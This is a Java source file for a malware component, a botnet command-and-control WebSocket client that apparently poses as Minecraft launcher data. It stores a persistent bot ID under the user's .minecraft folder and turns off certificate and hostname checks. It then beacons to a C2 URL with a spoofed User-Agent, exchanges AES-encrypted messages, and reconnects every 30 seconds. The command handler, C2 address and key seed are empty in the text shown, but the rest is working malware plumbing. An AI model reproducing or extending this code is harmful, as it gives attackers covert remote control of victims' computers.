import java.io.File;
import java.io.RandomAccessFile;
import java.net.URL;
import java.nio.channels.FileLock;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Map;
import java.util.Scanner;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class WebSocketHandler extends WebSocketListener {

    private static String c2WebSocketUrl;

    private static WebSocket activeWebSocket;

    private static SecretKeySpec aesKey;

    private static final Map<String, Object> pendingCommands;

    private static String botId;

    private static FileLock instanceLock;

    private static volatile boolean isConnected;

    private static final ExecutorService executor;

    private static void initAesKey() {
        try {
            if (aesKey != null) return;

            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] keyBytes = md.digest( "".getBytes("UTF-8"));
            aesKey = new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {

        }
    }

    private static String getBotId() {
        try {
            File uuidFile = new File(
                System.getenv("APPDATA") + "/.minecraft/launcher_uuid"
            );
            if (uuidFile.exists()) {
                return new Scanner(uuidFile).nextLine().trim();
            }
            String newId = UUID.randomUUID().toString();
            Files.write(uuidFile.toPath(), newId.getBytes());
            return newId;
        } catch (Exception e) {
            return UUID.randomUUID().toString();
        }
    }

    public static void connect() {
        try {
            initAesKey();
            botId = getBotId();

            OkHttpClient client = new OkHttpClient.Builder()
                .hostnameVerifier((hostname, session) -> true)
                .sslSocketFactory(
                    createTrustAllSSLContext().getSocketFactory(),
                    createTrustAllTrustManager()
                )
                .build();

            Request request = new Request.Builder()
                .url(c2WebSocketUrl)
                .addHeader("User-Agent", "Mozilla/5.0")
                .addHeader("X-Bot-Id", botId)
                .build();

            activeWebSocket = client.newWebSocket(request, new WebSocketHandler(false));

        } catch (Exception e) {

            scheduleReconnect();
        }
    }

    private static void scheduleReconnect() {
        executor.submit(() -> {
            try {
                TimeUnit.SECONDS.sleep(30);
                connect();
            } catch (InterruptedException ignored) {}
        });
    }

    @Override
    public void onOpen(WebSocket webSocket, Response response) {
        isConnected = true;

        sendEncrypted(webSocket, buildRegistrationMessage());
    }

    @Override
    public void onMessage(WebSocket webSocket, String text) {
        try {
            String decrypted = decryptMessage(text);
            handleCommand(webSocket, decrypted);
        } catch (Exception e) {

        }
    }

    @Override
    public void onClosed(WebSocket webSocket, int code, String reason) {
        isConnected = false;
        scheduleReconnect();
    }

    @Override
    public void onFailure(WebSocket webSocket, Throwable t, Response response) {
        isConnected = false;
        scheduleReconnect();
    }

    private void handleCommand(WebSocket webSocket, String jsonCommand) {

    }

    private static String encryptMessage(String plaintext) throws Exception {
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(plaintext.getBytes("UTF-8"));
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

    private static String decryptMessage(String base64) throws Exception {
        byte[] combined = Base64.getDecoder().decode(base64);
        byte[] iv = new byte[16];
        byte[] ciphertext = new byte[combined.length - 16];
        System.arraycopy(combined, 0, iv, 0, 16);
        System.arraycopy(combined, 16, ciphertext, 0, ciphertext.length);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, new IvParameterSpec(iv));
        return new String(cipher.doFinal(ciphertext), "UTF-8");
    }

    private static void sendEncrypted(WebSocket ws, String message) {
        try {
            ws.send(encryptMessage(message));
        } catch (Exception e) {

        }
    }

    private static X509TrustManager createTrustAllTrustManager() {
        return new X509TrustManager() {
            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
        };
    }

    private static javax.net.ssl.SSLContext createTrustAllSSLContext() throws Exception {
        javax.net.ssl.SSLContext ctx = javax.net.ssl.SSLContext.getInstance("TLS");
        ctx.init(null, new TrustManager[]{ createTrustAllTrustManager() }, new SecureRandom());
        return ctx;
    }

    private static String buildRegistrationMessage() {
        return "{\"type\":\"register\",\"id\":\"" + botId + "\",\"os\":\"Windows\"}";
    }

    public WebSocketHandler(boolean flag) {

    }

    static {
        executor = Executors.newCachedThreadPool();
        pendingCommands = new java.util.concurrent.ConcurrentHashMap<>();
    }
}